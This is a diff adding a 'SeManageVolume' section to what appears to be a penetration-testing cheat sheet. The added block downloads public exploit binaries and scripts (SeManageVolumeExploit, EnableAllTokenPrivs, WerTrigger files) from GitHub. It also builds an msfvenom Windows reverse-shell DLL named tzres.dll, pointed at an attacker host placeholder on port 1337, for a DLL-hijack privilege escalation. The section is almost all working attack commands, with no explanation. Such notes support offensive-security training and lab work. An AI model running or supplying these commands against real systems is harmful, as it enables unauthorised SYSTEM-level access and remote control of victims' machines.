@@ -237,6 +237,14 @@ windows + u
 ```
 ---
 # SeManageVolume
+```bash
+wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
+wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=1337 -f dll -o tzres.dll
+wget https://github.com/sailay1996/WerTrigger/raw/master/bin/WerTrigger.exe
+wget https://github.com/sailay1996/WerTrigger/raw/master/bin/phoneinfo.dll
+wget https://raw.githubusercontent.com/sailay1996/WerTrigger/master/bin/Report.wer
+```
 ```powershell
 . .\EnableAllTokenPrivs.ps1
 
